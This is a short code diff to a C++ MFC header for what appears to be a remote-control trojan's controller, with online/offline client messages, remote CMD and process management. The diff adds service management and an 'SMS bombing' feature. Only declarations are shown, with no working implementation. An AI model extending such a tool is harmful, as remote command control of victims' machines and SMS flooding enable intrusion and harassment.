@@ -10,6 +10,8 @@
 
 #include "Process.h"
 #include "Cmd.h"
+#include "Service.h"
+#include "SmsBoom.h"
 using namespace std;
 
 #define WM_ONLINE (WM_USER+100)   //上线
@@ -74,10 +76,16 @@ public:
 	LRESULT MyOffline(WPARAM wParam,LPARAM lParam);//下线
 	afx_msg void OnME(); //关于我
 	afx_msg void OnProcess();//进程管理
-	afx_msg void OnCMD();
+	afx_msg void OnCMD(); //远程CMD
+	afx_msg void OnSERVICE();  //服务管理
+	afx_msg void OnSMS();   //短信轰炸
 	void MyDeleteProcess();
 	void MyDeleteCMDShell();
+	void MyDeleteService();
+	void MyDeleteSmsBoom();
 public:
 	CProcess* m_Process;    //进程管理对象
 	CCmd* m_Cmd;   //远程CMD对象
+	CService* m_Service; //服务管理对象
+	CSmsBoom* m_SmsBoom; //短信轰炸
 };
